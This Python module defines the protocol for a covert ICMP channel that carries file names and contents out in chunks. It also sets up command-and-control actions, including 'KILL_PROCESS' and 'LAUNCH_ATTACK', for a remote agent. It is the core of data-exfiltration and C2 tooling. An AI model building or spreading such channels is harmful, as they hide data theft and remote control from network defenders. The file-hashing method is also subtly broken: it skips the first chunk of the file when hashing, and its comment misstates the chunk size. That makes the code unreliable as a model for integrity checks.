from scapy.all import ICMP
import hashlib

control_identifier = 0  # when the ID field is 0x00 the sequence contains a control code. Otherwise it contains bytes from a file.

control_codes = {
    "START_TRANSMISSION": 0,
    "STOP_TRANSMISSION": 1,
    "START_FILENAME": 2,
    "STOP_FILENAME": 3,
    "NEXT_CHUNK": 4,
    "START_VERIFY": 5,
    "STOP_VERIFY": 6,
}

# when running in C2 mode the controller may respond with a different seq number than the original ICMP packet it received. That control code tells the agent what to do next.
# TODO we map in both directions so this should probably be an enum or something
c2_actions = {
    "DO_NOTHING": 0,
    "KILL_PROCESS": 1,
    "LAUNCH_ATTACK": 2,
}


class absurdIcmp:
    control_identifier = control_identifier
    low_identifier = 1
    max_id = 65535  # max sequence number (2^16 - 1)

    control_codes = control_codes
    c2_actions = c2_actions

    start_icmp = ICMP(id=control_identifier, seq=control_codes["START_TRANSMISSION"])
    stop_icmp = ICMP(id=control_identifier, seq=control_codes["STOP_TRANSMISSION"])
    next_chunk_icmp = ICMP(id=control_identifier, seq=control_codes["NEXT_CHUNK"])
    start_verify_icmp = ICMP(id=control_identifier, seq=control_codes["START_VERIFY"])
    stop_verify_icmp = ICMP(id=control_identifier, seq=control_codes["STOP_VERIFY"])
    start_filename_icmp = ICMP(
        id=control_identifier, seq=control_codes["START_FILENAME"]
    )
    stop_filename_icmp = ICMP(id=control_identifier, seq=control_codes["STOP_FILENAME"])

    def hash_file(self, filename: str) -> bytes:
        """
        calculates the sha256 hash of a file returns a bytes object representing the hash
        """

        file_hash = hashlib.sha256()
        with open(filename, "rb") as f:
            file_bytes = f.read(64436)  # read 64kb
            while file_bytes := f.read(64436):
                file_hash.update(file_bytes)
        return file_hash.digest()
